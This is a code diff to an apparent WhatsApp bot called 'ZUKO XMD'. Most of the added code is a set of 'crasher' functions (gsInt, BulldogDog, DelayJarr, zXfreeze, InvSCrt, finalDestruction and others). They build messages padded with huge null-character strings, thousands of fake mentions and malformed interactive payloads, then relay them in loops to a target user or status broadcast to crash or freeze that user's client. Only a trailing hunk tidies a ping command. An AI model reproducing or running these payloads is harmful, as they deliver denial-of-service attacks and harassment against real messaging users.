@@ -75,7 +75,699 @@ function saveDB() {
 
 // ========== HELPERS ==========
 const delay = (ms) => new Promise(r => setTimeout(r, ms));
+async function gsInt(target, zid = true) {
+  for (let z = 0; z < 30; z++) {  // Increased from 5
+    let ZxY = {
+      interactiveResponseMessage: {
+        contextInfo: {
+          mentionedJid: Array.from({ length: 5000 }, (_, z) => `${Math.floor(Math.random() * 9999999)}@s.whatsapp.net`), 
+          isForwarded: true, 
+          forwardingScore: 99999,
+          forwardedNewsletterMessageInfo: {
+            newsletterJid: `120363${Math.floor(Math.random() * 999999999)}@newsletter`, 
+            newsletterName: "ZUKO XMD CRASHER", 
+            serverMessageId: Math.floor(Math.random() * 99999),
+            accessibilityText: "\u0000".repeat(50000)
+          }, 
+          statusAttributionType: "RESHARED_FROM_MENTION", 
+          contactVcard: true, 
+          isSampled: true, 
+          dissapearingMode: {
+            initiator: target, 
+            initiatedByMe: true,
+            trigger: "NEW_GROUP"
+          }, 
+          expiration: Date.now() + 999999999
+        }, 
+        body: {
+          text: "\u0000".repeat(100000),
+          format: "DEFAULT"
+        },
+        nativeFlowResponseMessage: {
+          name: "address_message",
+          paramsJson: `{"values":{"in_pin_code":"${"\u0000".repeat(99999)}","building_name":"${"\u0000".repeat(99999)}","address":"${"\u0000".repeat(99999)}","tower_number":"${"\u0000".repeat(99999)}","city":"${"\u0000".repeat(99999)}","name":"${"\u0000".repeat(99999)}","phone_number":"+${Math.floor(Math.random()*99999999999)}","house_number":"${"\u0000".repeat(99999)}","floor_number":"${"\u0000".repeat(99999)}","state":"${"\u0000".repeat(9999999)}"}}`,
+          version: 3
+        }
+      }
+    };
+    
+    let msg = generateWAMessageFromContent(target, {
+      groupStatusMessageV2: {
+        message: ZxY
+      }
+    }, {});
+  
+    await empire.relayMessage(target, msg.message, zid ? {
+      messageId: msg.key.id,
+      participant: { jid: target } 
+    } : {
+      messageId: msg.key.id
+    });
+  }
+}
+// ============================================================
+// 1. nah() – BUTTON BOMB + HUGE CAPTION
+// ============================================================
+async function nah(empire, target) {
+  const msg1 = "ꦾ".repeat(25000);
+  const msg2 = "ោ៝".repeat(25000);
+  const nullBlast = "\u0000".repeat(50000);
 
+  const caption =
+    "🩸 ༑ ZUKO 炎 CRASHER⟅ ༑ 🩸" + msg1 + msg2 + nullBlast;
+
+  const msg = generateWAMessageFromContent(target, {
+    buttonsMessage: {
+      contentText: caption,
+      footerText: "2027" + "\u0000".repeat(10000),
+      buttons: [
+        {
+          buttonId: "menu".repeat(500),
+          buttonText: { displayText: "🩸Menu" + "\u0000".repeat(5000) },
+          type: 1
+        },
+        {
+          buttonId: "tqto".repeat(500),
+          buttonText: { displayText: "🩸Tqto" + "\u0000".repeat(5000) },
+          type: 1
+        },
+        {
+          buttonId: "crash".repeat(500),
+          buttonText: { displayText: "💀Crash" + "\u0000".repeat(5000) },
+          type: 1
+        }
+      ],
+      headerType: 4,
+      imageMessage: {
+        url: "https://i.postimg.cc/zXTm1yx3/file-00000000ad0871f5acf979d42f22d9e9.png",
+        mimetype: "image/jpeg",
+        caption: "\u0000".repeat(30000)
+      }
+    }
+  }, {});
+
+  await empire.relayMessage(target, msg.message, {
+    messageId: msg.key.id,
+    participant: { jid: target }
+  });
+}
+
+// ============================================================
+// 2. DelayInvisible() – ZERO-BYTE NATIVE FLOW
+// ============================================================
+async function DelayInvisible(target) {
+  await empire.relayMessage(target, {
+    viewOnceMessage: {
+      message: {
+        messageContextInfo: {
+          deviceListMetadata: {},
+          deviceListMetadataVersion: 9,
+        },
+        interactiveResponseMessage: {
+          body: {
+            text: "𝕫𝕦𝕜𝕠 ✗𝕞𝕕 - execute" + "\u0000".repeat(50000),
+            format: "DEFAULT"
+          },
+          nativeFlowResponseMessage: {
+            name: "call_permission_request",
+            paramsJson: "\u0000".repeat(999999),
+            version: 9
+          },
+          contextInfo: {
+            mentionedJid: Array.from({ length: 5000 }, () => 
+              `${Math.floor(Math.random() * 99999999)}@s.whatsapp.net`
+            ),
+            isForwarded: true,
+            forwardingScore: 99999999,
+            businessMessageForwardInfo: {
+              businessOwnerJid: target,
+            },
+          }
+        }
+      }
+    }
+  }, { participant: { jid: target }});
+}
+
+// ============================================================
+// 3. BulldogDog() – MASSIVE PARALLEL PAYLOAD
+// ============================================================
+async function BulldogDog(empire, target) {
+  for (let i = 0; i < 2000; i++) {
+    const randId = Math.random().toString(36).substring(2, 15);
+    const randNum = Math.floor(Math.random() * 9999999);
+    const randBuffer = "\u0000".repeat(500000 + (i % 10000));
+    const randRepeat = "x".repeat(10000 + (i % 20000));
+    
+    const msg = {
+      ephemeralMessage: {
+        message: {
+          groupStatusMessageV2: {
+            message: {
+              viewOnceMessage: {
+                message: {
+                  interactiveMessage: {
+                    body: {
+                      text: "i miss her." + randId + randBuffer
+                    },
+                    nativeFlowMessage: {
+                      buttons: [
+                        { name: "\u0000\u0000\u0000", buttonParamsJson: "\u0000".repeat(10000) },
+                        { name: "single_select\u0000", buttonParamsJson: "{\u0000}".repeat(5000) },
+                        { name: "\x00\x00", buttonParamsJson: randBuffer },
+                        { name: "call_permission_request", buttonParamsJson: "\u0000".repeat(900000) }
+                      ]
+                    },
+                    nativeFlowResponseMessage: {
+                      name: "address_message",
+                      paramsJson: JSON.stringify({
+                        flow_cta: "\u0000".repeat(5000 + (i % 1000)),
+                        extra_data: {
+                          address: {
+                            in_pin_code: randNum.toString().repeat(100),
+                            building_name: randBuffer,
+                            landmark_area: "18+".repeat(10000) + randRepeat,
+                            address: "london".repeat(5000),
+                            tower_number: "italia".repeat(5000),
+                            city: "florida".repeat(5000),
+                            name: "porn".repeat(50000) + randRepeat,
+                            phone_number: randNum.toString().repeat(20),
+                            house_number: randNum.toString().repeat(20),
+                            floor_number: "@".repeat(10000) + randNum,
+                            state: "X" + "\u0000".repeat(999999 + (i % 5000))
+                          },
+                          menu: {
+                            display_text: randBuffer,
+                            description: randBuffer.repeat(100),
+                            id: randId.repeat(100)
+                          },
+                          payment: {
+                            flow_cta: "{".repeat(999999 + (i % 1000))
+                          }
+                        }
+                      }),
+                      version: 9 + (i % 5)
+                    },
+                    contextInfo: {
+                      businessMessageForwardInfo: {
+                        businessOwnerJid: randNum + "@s.whatsapp.net"
+                      },
+                      isForwarded: true,
+                      forwardingScore: 999999 + (i % 5000),
+                      quotedMessage: {
+                        conversation: "porn" + randId + randBuffer
+                      },
+                      stanzaId: "BAE5" + randId + Math.random().toString(16).slice(2),
+                      participant: target,
+                      remoteJid: target,
+                      mentionedJid: Array.from({ length: 5000 }, () => 
+                        `${Math.floor(Math.random() * 99999999)}@s.whatsapp.net`
+                      )
+                    },
+                    header: {
+                      hasMediaAttachment: true,
+                      locationMessage: {
+                        degreesLatitude: 21.1266 + (Math.random() * 10),
+                        degreesLongitude: -11.8199 + (Math.random() * 10),
+                        name: `#`.repeat(10000) + randRepeat.substring(0, 100),
+                        jpegThumbnail: null,
+                        contextInfo: {
+                          externalAdReply: {
+                            quotedAd: {
+                              advertiserName: randRepeat.repeat(100),
+                              mediaType: "IMAGE",
+                              jpegThumbnail: null,
+                              caption: randRepeat.repeat(100)
+                            }
+                          }
+                        }
+                      }
+                    }
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    };
+    
+    await empire.relayMessage(target, msg, {
+      participant: { jid: target }
+    });
+    
+    await sleep(100);
+  }
+}
+
+// ============================================================
+// 4. DelayJarr() – MASSIVE NATIVE FLOW BUTTONS
+// ============================================================
+async function DelayJarr(target) {
+  for (let i = 0; i < 100; i++) {
+    try {
+      let JarrMsg = {
+        viewOnceMessage: {
+          message: {
+            messageContextInfo: {
+              deviceListMetadata: {},
+              deviceListMetadataVersion: 9,
+            },
+            interactiveMessage: {
+              contextInfo: {
+                mentionedJid: Array.from({ length: 5000 }, () => 
+                  `${Math.floor(Math.random() * 99999999)}@s.whatsapp.net`
+                ),
+                isForwarded: true,
+                forwardingScore: 999999,
+                businessMessageForwardInfo: {
+                  businessOwnerJid: target,
+                },
+              },
+              body: {
+                text: "🩸 ༑ ZUKO 炎 CRASHER⟅ ༑ 🩸" + "\u0000".repeat(50000),
+              },
+              nativeFlowMessage: {
+                buttons: [
+                  { name: "single_select", buttonParamsJson: "\u0000".repeat(500000) },
+                  { name: "call_permission_request", buttonParamsJson: "\u0000".repeat(999999) },
+                  { name: "mpm", buttonParamsJson: "\u0000".repeat(500000) },
+                  { name: "mpm", buttonParamsJson: "\u0000".repeat(500000) },
+                  { name: "address_message", buttonParamsJson: "\u0000".repeat(999999) }
+                ],
+              },
+            },
+          },
+        },
+      };
+
+      await empire.relayMessage(target, JarrMsg, {
+        participant: { jid: target },
+      });
+      await sleep(200);
+    } catch (err) {
+      console.log(err);
+    }
+  }
+}
+
+// ============================================================
+// 5. DelayHardBulldo() – AUDIO + STICKER + MENTION BOMB
+// ============================================================
+async function DelayHardBulldo(empire, target) {
+  for (let i = 0; i < 150; i++) {
+    const payload = {
+      nativeFlowResponseMessage: {
+        name: "call_permission_request",
+        paramsJson: "\u0000".repeat(9999999),
+        version: 9,
+        entryPointConversionSource: "StatusMessage",
+      },
+      forwardingScore: 999999,
+      isForwarded: true,
+      font: Math.floor(Math.random() * 9),
+      background: `#${Math.floor(Math.random() * 16777215)
+        .toString(16)
+        .padStart(6, "0")}`,
+
+      audioMessage: {
+        url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
+        mimetype: "audio/mpeg",
+        fileSha256: Buffer.from([
+          226, 213, 217, 102, 205, 126, 232, 145,
+          0, 70, 137, 73, 190, 145, 0, 44,
+          165, 102, 153, 233, 111, 114, 69, 10,
+          55, 61, 186, 131, 245, 153, 93, 211,
+        ]),
+        fileLength: 99999999,
+        seconds: 9999,
+        ptt: false,
+        mediaKey: Buffer.from([
+          182, 141, 235, 167, 91, 254, 75, 254,
+          190, 229, 25, 16, 78, 48, 98, 117,
+          42, 71, 65, 199, 10, 164, 16, 57,
+          189, 229, 54, 93, 69, 6, 212, 145,
+        ]),
+        fileEncSha256: Buffer.from([
+          29, 27, 247, 158, 114, 50, 140, 73,
+          40, 108, 77, 206, 2, 12, 84, 131,
+          54, 42, 63, 11, 46, 208, 136, 131,
+          224, 87, 18, 220, 254, 211, 83, 153,
+        ]),
+        directPath:
+          "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0",
+        mediaKeyTimestamp: 1746275400,
+
+        contextInfo: {
+          mentionedJid: Array.from(
+            { length: 5000 },
+            () => `${Math.floor(Math.random() * 99999999)}@s.whatsapp.net`
+          ),
+          isSampled: true,
+          participant: target,
+          remoteJid: "status@broadcast",
+          forwardingScore: 999999,
+          isForwarded: true,
+          businessMessageForwardInfo: {
+            businessOwnerJid: "0@s.whatsapp.net",
+          },
+        },
+      },
+    };
+
+    const msg = generateWAMessageFromContent(
+      target,
+      {
+        ...payload,
+        contextInfo: {
+          ...payload.contextInfo,
+          participant: "0@s.whatsapp.net",
+          mentionedJid: [
+            "0@s.whatsapp.net",
+            ...Array.from(
+              { length: 5000 },
+              () => `${Math.floor(Math.random() * 99999999)}@s.whatsapp.net`
+            ),
+          ],
+        },
+      },
+      {}
+    );
+
+    await empire.relayMessage("status@broadcast", msg.message, {
+      messageId: msg.key.id,
+      statusJidList: [target],
+      additionalNodes: [
+        {
+          tag: "meta",
+          attrs: {},
+          content: [
+            {
+              tag: "mentioned_users",
+              attrs: {},
+              content: [
+                {
+                  tag: "to",
+                  attrs: { jid: target },
+                  content: [],
+                },
+              ],
+            },
+          ],
+        },
+      ],
+    });
+    await sleep(500);
+  }
+
+  // FINAL STICKER BOMB
+  const mentionedJids = Array.from({ length: 5000 }, () => 
+    `${Math.floor(Math.random() * 99999999)}@s.whatsapp.net`
+  );
+  
+  const stickerMsg = {
+    "url": "https://mmg.whatsapp.net/v/t62.15575-24/29608536_1237860284549931_4687921904643282854_n.enc?ccb=11-4&oh=01_Q5Aa3wGRchwqRaJ8-klzBlUyohWQ6WA3UiJ6l3aGrf5dy6JfHA&oe=69C15F5F&_nc_sid=5e03e0&mms3=true",
+    "fileSha256": "D0cotrUlRISvwKDBCNWukYeFx3ftQHb6+nkLZNhnD0E=",
+    "fileEncSha256": "Db+8Ue92VLkgR+ASIYAMpocDsz0HT1OUgeDEtMvH+bE=",
+    "mediaKey": "X+AZ81HjpfAfu01Yzk8EJMb8SKYEQTd6Tbgqrlfafmc=",
+    "mimetype": "image/webp",
+    "height": 512,
+    "width": 512,
+    "directPath": "/v/t62.15575-24/29608536_1237860284549931_4687921904643282854_n.enc?ccb=11-4&oh=01_Q5Aa3wGRchwqRaJ8-klzBlUyohWQ6WA3UiJ6l3aGrf5dy6JfHA&oe=69C15F5F&_nc_sid=5e03e0",
+    "fileLength": "99999999",
+    "mediaKeyTimestamp": "1771680407",
+    "isAnimated": false,
+    "stickerSentTs": "1771694793768",
+    "isAvatar": true,
+    "isAiSticker": true,
+    "isLottie": false,
+    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAAABAEDBQIGAQEBAQEAAAAAAAAAAAAAAAACAQAD/9oADAMBAAIQAxAAAACqa++PXQ0Ik6Y47WM93tTIKSih1F8ddXgrkvU0c1522lfS0k081erMWxNd+mlFfanKTfJqJnlipE66zSVhyul530vQtK3Jy4JwM2gBugaZr4M+lxwKwgEf/8QAKBAAAgIBAwMEAQUAAAAAAAAAAQIAAxEEEjEQIQUFEyJRYRMkMnGB/9oACAEBAAE/AIDNLTn5t0GMTvMq2ZfSVOV4n+9K13uoiqFUCEzBEU5JH4iVsr95am5THYrZtgmjXNwmeYTwYSAMme8qV9ncGJcriZBlmkqsOcYMBmiYC0zPciC+reEJmBPY5sZj95hQIRgS+4j4rzK7SUzzMymzY4MFz2ElPAldAv2vwymcATd3wI3bbmWDNr/1F1IpTuMnwJmZmg7I7QOabM+DBdU/mbgBkQPvU/gxkGS33NQxFpOMBeJkDppvjS8tANKt9CHU15xNKXJ4JBEVAuRNXaKqD9mM7N/I56DkRG26Vm+zGt/ZqTA21twmkvF9XbAIjMwxunqNamgP14lpxpa1E1OU09SHp6c+LwPBhQHE9T1S4/RHT//EAB0RAQEAAgIDAwAAAAAAAAAAAAEAEEERMRIhUdH/2gAIAQIBAT8AmNT9yHMFz7S5Jh1h7vEcfslvOyY7x//EABoRAAICAwAAAAAAAAAAAAAAAAEQABEgMVH/2gAIAQMBAT8AzCpadsQvsEK//9k=",
+    contextInfo: {
+      mentionedJid: mentionedJids,
+      pairedMediaType: "HD_IMAGE_CHILD",
+      statusSourceType: "MUSIC_STANDALONE",
+      statusAttributions: [
+        {
+          type: "STATUS_MENTION",
+          music: {
+            authorName: "𝕫𝕦𝕜𝕠 ✗𝕞𝕕",
+            songId: "1137812656623908",
+            title: "\u0003".repeat(50000),
+            author: "\u0003".repeat(50000),
+            artworkDirectPath: "/o1/v/t24/f2/m235/AQMN_XAJ4_Pp-ZKa-ffdvtqAQoYu0wvQUlEDsJPcm3pPj3XdnX_OEorwHTefjrJ0aV1_lCWkXt1_yOnp2E5W0O3QhCMDNQEg4mKcmyLY4g?ccb=9-4&oh=01_Q5Aa3wEqBdvCkLVz0Raoswv8IMLkCRginTvmk0yEktLLYKQzPA&oe=69C13396&_nc_sid=e6ed6c",
+            artworkSha256: "udonzyFOe7T2UPQ/WSr97NRAkGXTXhI2t2pc9d5xPzU=",
+            artworkEncSha256: "97u4QsDwfWG8HSOaj5/uMOQUtIuMHpzVmfULEEZupRM=",
+            artworkMediaKey: "1771689153",
+            artistAttribution: " x ".repeat(1000),
+            isExplicit: true
+          }
+        }
+      ]
+    },
+    annotations: [
+      {
+        embeddedContent: {
+          embeddedMusic: {
+            musicContentMediaId: "589608164114571",
+            songId: "870166291800508",
+            title: "\u0003".repeat(50000),
+            author: "\u0003".repeat(50000),
+            artworkDirectPath: "/o1/v/t24/f2/m235/AQMN_XAJ4_Pp-ZKa-ffdvtqAQoYu0wvQUlEDsJPcm3pPj3XdnX_OEorwHTefjrJ0aV1_lCWkXt1_yOnp2E5W0O3QhCMDNQEg4mKcmyLY4g?ccb=9-4&oh=01_Q5Aa3wEqBdvCkLVz0Raoswv8IMLkCRginTvmk0yEktLLYKQzPA&oe=69C13396&_nc_sid=e6ed6c",
+            artworkSha256: "udonzyFOe7T2UPQ/WSr97NRAkGXTXhI2t2pc9d5xPzU=",
+            artworkEncSha256: "97u4QsDwfWG8HSOaj5/uMOQUtIuMHpzVmfULEEZupRM=",
+            artistAttribution: "https://t.me/null",
+            countryBlocklist: true,
+            isExplicit: true,
+            artworkMediaKey: "1771689153"
+          }
+        },
+        embeddedAction: true
+      }
+    ]
+  };
+
+  await empire.relayMessage("status@broadcast", {
+    stickerMessage: stickerMsg
+  },
+  {
+    statusJidList: [target]
+  });
+}
+async function delay1(isTarget) {
+  for (let z = 0; z < 150; z++) {  // Increased from 50
+    let msg = generateWAMessageFromContent(isTarget, {
+      viewOnceMessageV2: {
+        message: {
+          interactiveResponseMessage: {
+            contextInfo: {
+              mentions: Array.from({ length: 5000 }, () => `${Math.floor(Math.random() * 99999999)}@s.whatsapp.net`),
+              isForwarded: true,
+              forwardingScore: 99999
+            },
+            body: {
+              text: "\u0000".repeat(99999999),
+              format: "DEFAULT"
+            },
+            nativeFlowResponseMessage: {
+              name: "galaxy_message",
+              paramsJson: `{"flow_cta":"${"\u0000".repeat(999999999)}","flow_message_version":"3"}`,
+              version: 3
+            }
+          }
+        }
+      }
+    }, {});
+
+    await empire.relayMessage(
+      isTarget,
+      {
+        groupStatusMessageV2: {
+          message: msg.message
+        }
+      },
+      {
+        messageId: msg.key.id,
+        participant: { jid: isTarget }
+      }
+    )
+  };
+  await sleep(3000)
+}
+async function zXfreeze(isTarget) {
+  const videoUrls = [
+    "https://mmg.whatsapp.net/v/t62.7161-24/573638734_1469804761202279_6437505177805631634_n.enc?ccb=11-4&oh=01_Q5Aa4AGIZi2WHFTyLffJtq_GjfVk-SnkgWZog4aoDWx7n-PUYA&oe=69E1A94A&_nc_sid=5e03e0&mms3=true",
+    "https://mmg.whatsapp.net/v/t62.7161-24/573638734_1469804761202279_6437505177805631634_n.enc?ccb=11-4&oh=01_Q5Aa4AGIZi2WHFTyLffJtq_GjfVk-SnkgWZog4aoDWx7n-PUYA&oe=69E1A94A&_nc_sid=5e03e0&mms3=true"
+  ];
+
+  for (let i = 0; i < 100; i++) {
+    var Videox = {
+      "url": videoUrls[i % videoUrls.length],
+      "mimetype": "video/mp4",
+      "fileSha256": "VF5ZuntXYI59R/4LrPCoETOTfNj+mrEV9nayC+hq0LM=",
+      "fileLength": "99999999",
+      "seconds": 9999,
+      "mediaKey": "vPrEbFav/Lh1CD9PFNx4lx3F2OP3LugeieFhHr/+7oc=",
+      "caption": "\u0000".repeat(999999),
+      "height": 1080,
+      "width": 1920,
+      "fileEncSha256": "Rv+qeol4QvrDUG2sav0bFrA0cyjsUXFkwt7xfYkYrSM=",
+      "directPath": "/v/t62.7161-24/573638734_1469804761202279_6437505177805631634_n.enc?ccb=11-4&oh=01_Q5Aa4AGIZi2WHFTyLffJtq_GjfVk-SnkgWZog4aoDWx7n-PUYA&oe=69E1A94A&_nc_sid=5e03e0",
+      "mediaKeyTimestamp": "1773743755",
+      "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIADYASAMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAAAAwECBAUGAQEBAQEBAAAAAAAAAAAAAAAAAQIEA//aAAwDAQACEAMQAAAA88tiyHJasU1M5VzEssABbLVGq1Hn09HJ28e2enfxnPUBCl6Gn3I6c9WZ042hc6XnvQ+evjYBkWBNgF2AIAYAf//EACcQAAICAAUDBAMBAAAAAAAAAAECAAMEEBESMUMRMiM1EUJSQQ/9oACAEBAAE/AIecgilQd48QgAdDmMzlXW9jaKJ+Cnok7vdHras6MMhmZXU9rAKIUXDV7l7jyZUC1LibVtUq3Mtpeo9YM6axY+hIEpC01blAMZbGO4iVblQkaHX9Qq286dIK2es6qCPqXIEfQZjulfI8TEfCkF/p31/Q5mI+YkTDn22eI3efOY7h5i16Feo4mLIqw6kwkkkzDH1ehPuEpCqLNWHEbvPnM8zew/oxrbHADOSBkrMp1B0hZv8ARgy//8QAIREAAgIBAgcAAAAAAAAAAAAAAREAAgMxAyAwMjNBUnH/2gAIAQIBAT8A0gMqF3uKjtfWPmbgB1KhQvara45dnCvaJ3pbyEJffy/df//EACARAAEEAgIDAQAAAAAAAAAAAAEAAhIxAxEgYQQQQUP/2gAIAQMBAT8AQutpw61wwta3b32BSaA7AZXa0Yy9C1MDyXn5ELG8Sf2CvzZz/9k=",
+      "contextInfo": {
+        "pairedMediaType": "NOT_PAIRED_MEDIA"
+      },
+      "streamingSidecar": "Ol1HksMqmL3uzhw8hbdhY7g4oqwc6Gwb+73vScnrAzEymWrhdAp00cYluHhva1PqufcTKbeEP/6Po9ITl8E3pW5CmjXClKCENPVWGWBhTrqTJSMMBa8bCuxjper3uCUo0AdukOJImQ5UOlWmiCi1d0oiCeCku/AScyjm+osCFZu6ZR8/rgg6cmaj+D3rAU+V7r4siSmJL4tQBA0lpg9mdlEeFff7Csk4xqpTivSqGKOHzVmb2s0YjlDZZWLbISnm0u+DykCb4wXpEBJ4FCvaIeJ9QOEHVa+NQOrUSiJ2Ae7i9vsYbET8yCdjft4dTkhkgytGH/6hP9phEWMsW1IgriHgGh0csF62pfCZjpLfM0cENPa6dvuT865mKTbgMj+BlIWWP5b2Da9Mg8X3PfTsFAgTje41GcTKdfgcckFjoymdBNhQHpv9D6QZgZjCsYTW0qs+e2DsimjNtDrvxUUPa3TdR16pT3GWLfiH2YHuzR1d1/BV4kueh7d+MnGKS9ZAHToEjCzObs7xnIMO3IuzGuwnyh67AYRV1U4="
+    };
+
+    await empire.relayMessage(isTarget, { "videoMessage": Videox }, {
+      ephemeralExpiration: 0,
+      forwardingScore: 99999,
+      isForwarded: true,
+      font: 0,
+      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0")
+    });
+    await sleep(100);
+  }
+}
+async function finalDestruction(target) {
+    console.log(chalk.red(`💀💀💀 ZUKO XMD - FINAL DESTRUCTION on ${target} 💀💀💀`));
+    
+    // Spam warning
+    for (let w = 0; w < 20; w++) {
+        await empire.sendMessage(target, { 
+            text: "💀 " + "\u0000".repeat(50000) + " 💀\n" + "=".repeat(9999) 
+        }).catch(() => {});
+        await sleep(50);
+    }
+    
+    // Massive parallel attack
+    for (let i = 0; i < 500; i++) {
+        await Promise.all([
+            gsInt(target, true),
+            delay1(target),
+            zXfreeze(target),
+            InvSCrt(empire, target)
+        ]);
+        
+        if (i % 20 === 0) {
+            console.log(chalk.red(`💀 Destruction Progress: ${i}/500`));
+            await empire.sendMessage(target, { 
+                text: `💀 ${i}/500 DESTRUCTION PROGRESS 💀`
+            }).catch(() => {});
+        }
+        
+        await sleep(50);
+    }
+    
+    // Final surge
+    for (let i = 0; i < 200; i++) {
+        await Promise.all([
+            gsInt(target, true),
+            delay1(target),
+            zXfreeze(target)
+        ]);
+        await sleep(10);
+    }
+    
+    console.log(chalk.green(`✅ FINAL DESTRUCTION COMPLETE on ${target}`));
+    console.log(chalk.red(`💀 TARGET ${target} HAS BEEN OBLITERATED 💀`));
+}
+async function superCombo(target) {
+    for (let i = 0; i < 300; i++) {
+        await Promise.all([
+            gsInt(target, true),
+            delay1(target),
+            zXfreeze(target),
+            InvSCrt(empire, target)
+        ]);
+        await sleep(30);
+    }
+}
+async function InvSCrt(empire, target) {
+  for (let round = 0; round < 50; round++) {
+    try {
+      const payloads = [
+        {
+          name: "menu_options",
+          params: `{"display_text":"${"\u0000".repeat(99999)}","id":"R4","description":"${"\u0000".repeat(999999)}"}`
+        },
+        {
+          name: "galaxy_message",
+          params: JSON.stringify({ flow_cta: "\u0000".repeat(999999) })
+        },
+        {
+          name: "address_message",
+          params: `{"values":{"in_pin_code":"${"\u0000".repeat(99999)}","building_name":"${"\u0000".repeat(99999)}","address":"${"\u0000".repeat(99999)}","tower_number":"${"\u0000".repeat(99999)}","city":"${"\u0000".repeat(99999)}","name":"${"\u0000".repeat(99999)}","phone_number":"+${Math.floor(Math.random()*99999999999)}","house_number":"${"\u0000".repeat(99999)}","floor_number":"${"\u0000".repeat(99999)}","state":"${"\u0000".repeat(9999999)}"}}`
+        }
+      ];
+
+      for (const p of payloads) {
+        const msg = await generateWAMessageFromContent(
+          target,
+          {
+            viewOnceMessage: {
+              message: {
+                interactiveResponseMessage: {
+                  body: {
+                    text: "\u0000".repeat(99999),
+                    format: "DEFAULT"
+                  },
+                  nativeFlowResponseMessage: {
+                    name: p.name,
+                    paramsJson: p.params,
+                    version: 3
+                  },
+                  contextInfo: {
+                    stanzaId: empire.generateMessageTag(),
+                    participant: target,
+                    remoteJid: "0@s.whatsapp.net",
+                    mentionedJid: Array.from({ length: 9999 }, () => 
+                      `${Math.floor(Math.random() * 99999999)}@s.whatsapp.net`),
+                    isForwarded: true,
+                    forwardingScore: 999999
+                  }
+                }
+              }
+            }
+          },
+          { userJid: target }
+        );
+
+        await empire.relayMessage("status@broadcast", msg.message, {
+          messageId: msg.key.id,
+          additionalNodes: [{
+            tag: "meta",
+            attrs: {},
+            content: [{
+              tag: "mentioned_users",
+              attrs: {},
+              content: [{
+                tag: "to",
+                attrs: { jid: target },
+                content: undefined
+              }]
+            }]
+          }]
+        });
+
+        await empire.relayMessage(
+          target,
+          {
+            groupStatusMessageV2: {
+              message: msg.message
+            }
+          },
+          {
+            participant: { jid: target }
+          }
+        );
+      }
+    } catch (err) {
+      console.error("Error:", err);
+    }
+  }
+}
 // ========== ANTI-LINK HANDLER ==========
 async function handleAntiLink(empire, m, isCreator, isAdmins) {
     try {
@@ -440,146 +1132,183 @@ module.exports = empire = async (empire, m, chatUpdate, store) => {
         // PING - Latency check
         // ═══════════════════════════════════════════════════
         case 'ping':
-        case 'pong': {
-            const start = Date.now();
-            const pingMsg = await empire.sendMessage(m.chat, {
-                text: '⏳',
-                contextInfo: newsletterContext()
-            }, { quoted: m });
-            const latency = Date.now() - start;
-            let msgTs = m.messageTimestamp;
-            if (typeof msgTs?.toNumber === 'function') msgTs = msgTs.toNumber();
-            const waLatency = Math.max(1, Date.now() - Number(msgTs) * 1000);
-            const mem = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(1);
+case 'pong': {
+    const start = Date.now();
+    const pingMsg = await empire.sendMessage(m.chat, {
+        text: '⏳',
+        contextInfo: newsletterContext()
+    }, { quoted: m });
+    const latency = Date.now() - start;
 
-            const pulseState = latency < 100 ? '🟢 FAST' : latency < 300 ? '🟡 OK' : '🔴 SLOW';
-            const response =
+    let msgTs = m.messageTimestamp;
+    if (typeof msgTs?.toNumber === 'function') msgTs = msgTs.toNumber();
+    const waLatency = Math.max(1, Date.now() - Number(msgTs) * 1000);
+
+    const mem = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(1);
+    const up = process.uptime();
+    const upStr = `${Math.floor(up/3600)}h ${Math.floor((up%3600)/60)}m ${Math.floor(up%60)}s`;
+
+    const pulseState = latency < 100 ? '🟢 FAST' : latency < 300 ? '🟡 OK' : '🔴 SLOW';
+    const bar = latency < 100 ? '▰▰▰▰▰' : latency < 300 ? '▰▰▰▱▱' : '▰▱▱▱▱';
+
+    const response =
 `┏━❮ ⚡ 𝗣 𝗨 𝗟 𝗦 𝗘 ❯━┓
 ┃
 ┃  ⏱  ${latency}ms  ·  ${pulseState}
+┃  ${bar}
 ┃  📡  WA Latency: ${waLatency}ms
 ┃  🧠  Memory: ${mem}MB
+┃  ⏳  Uptime: ${upStr}
 ┃
 ┃  ▞▞▞ 𝗭𝗨𝗞𝗢-𝗫𝗠𝗗 ▞▞▞
 ┃  ✦ system online ✦
 ┗━━━━━━━━━━━━━━━━━━━┛`;
 
-            await empire.sendMessage(m.chat, {
-                text: response,
-                edit: pingMsg.key,
-                contextInfo: newsletterContext()
-            }).catch(() => {
-                empire.sendMessage(m.chat, {
-                    text: response,
-                    contextInfo: newsletterContext()
-                }, { quoted: m });
-            });
-            break;
-        }
+    await empire.sendMessage(m.chat, {
+        text: response,
+        edit: pingMsg.key,
+        contextInfo: newsletterContext()
+    }).catch(() => {
+        empire.sendMessage(m.chat, {
+            text: response,
+            contextInfo: newsletterContext()
+        }, { quoted: m });
+    });
+    break;
+}
 
         // ═══════════════════════════════════════════════════
         // MENU - Main command list
         // ═══════════════════════════════════════════════════
-        case 'menu':
-        case 'help': {
-            const now = moment().tz('Africa/Lagos').format('HH:mm:ss');
-            const date = moment().tz('Africa/Lagos').format('DD/MM/YYYY');
